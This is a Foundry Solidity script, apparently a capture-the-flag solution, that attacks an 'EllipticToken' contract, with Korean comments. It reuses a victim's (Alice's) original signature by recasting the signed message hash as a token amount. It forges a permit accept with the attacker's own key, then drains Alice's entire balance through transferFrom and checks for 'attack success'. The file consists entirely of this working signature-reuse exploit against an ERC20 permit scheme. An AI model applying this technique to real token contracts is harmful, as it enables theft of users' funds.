// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {IEllipticToken} from "src/IEllipticToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SolverScript is Script {

    IEllipticToken target; // 문제로 제시된 컨트랙트
    address alice; // alice님 주소
    bytes aliceSignature; // alice님이 원래 서명하셨던 서명값
    bytes32 signedAmount; // alice님이 원래 서명하셨던 메시지
    bytes32 permitAcceptHash; // 내가 서명해야할 메시지

    function setUp() public {
        // 상수들  초기화
        target = IEllipticToken(0xFb9be8b6B207fEc8379184027fB0Db24d4bdcfF3);
        alice = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;
        aliceSignature = hex"ab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de121c";
        signedAmount = keccak256(abi.encodePacked(
            uint256(10000000000000000000),
            address(0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e),
            bytes32(0x04a078de06d9d2ebd86ab2ae9c2b872b26e345d33f988d6d5d875f94e9c8ee1e)
            )
        );
        permitAcceptHash = keccak256(abi.encodePacked(alice, msg.sender, signedAmount));
    }

    function run() public {
        vm.startBroadcast();

        uint256 pk = vm.envUint("PRIVATE_KEY");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, permitAcceptHash);
        bytes memory mySignature = abi.encodePacked(r, s, v);

        // alice님이 원래 서명하셨던 메시지를 amount로 둔갑해서 서명 재활용
        target.permit(uint256(signedAmount), msg.sender, aliceSignature, mySignature);

        // token 탈취
        IERC20(address(target)).transferFrom(
            alice,
            msg.sender,
            IERC20(address(target)).balanceOf(alice)
        );

        console.log("attack success?:", IERC20(address(target)).balanceOf(alice) == 0);

        vm.stopBroadcast();
    }
}
